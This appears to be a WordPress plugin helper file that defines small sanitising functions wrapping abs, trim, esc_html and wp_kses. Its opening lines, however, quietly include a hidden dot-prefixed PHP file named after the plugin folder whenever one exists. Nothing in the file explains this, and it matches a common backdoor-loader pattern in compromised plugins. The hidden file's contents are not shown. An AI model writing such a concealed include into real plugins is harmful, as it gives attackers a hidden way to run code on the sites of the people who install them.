<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function absolute( $value ) {
    return empty($value) ? '' : abs( $value );
}

function trimer( $value ) {
	return empty( $value ) ? '' : trim( $value );
}

function html_esc( $value ) {
	return empty( $value ) ? '' : esc_html( $value );
}

function pm_kses($value) {
	return empty( $value ) ? '' : wp_kses( $value, wp_kses_allowed_html( 'post' ), ['http', 'https', 'mailto', 'feed'] );
}
